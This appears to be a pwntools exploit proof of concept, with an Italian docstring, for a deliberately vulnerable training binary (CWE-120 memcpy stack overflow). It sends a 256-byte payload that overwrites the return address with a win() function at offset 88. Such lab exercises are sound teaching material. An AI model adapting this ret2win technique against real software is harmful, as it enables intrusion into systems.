"""
@file CWE-120 Memcpy Overflow Stack Exploit.py
@brief Exploit PoC per CWE-120
Target: CWE-120 Memcpy Overflow

Descrizione:
Invia un payload di lunghezza 256 byte che sfrutta l'errore di casting
del size check per sovrascrivere il Return Address con `win()`.

Prerequisiti:
- Pwntools
"""

# Exploit for vuln2: Memcpy Stack Overflow (Ret2Win)
from pwn import *
import os

binary_path = os.path.abspath('../build/CWE-120 Memcpy Overflow')
if len(sys.argv) > 1:
    binary_path = os.path.abspath(sys.argv[1])
elf = ELF(binary_path, checksec=False)
context.binary = elf

log.info("Starting exploit for vuln2 (Memcpy -> Ret2Win)...")

win_addr = elf.symbols['win']
log.info(f"Target 'win' address: {hex(win_addr)}")


offset = 88

log.info(f"Using offset: {offset}")

p = process(binary_path)

payload = flat({offset: win_addr})

if len(payload) < 256:
    payload += b'A' * (256 - len(payload))


p.send(payload)

p.recvuntil(b"Done\n")
log.success("Exploit sent. Check for shell...")
p.interactive()


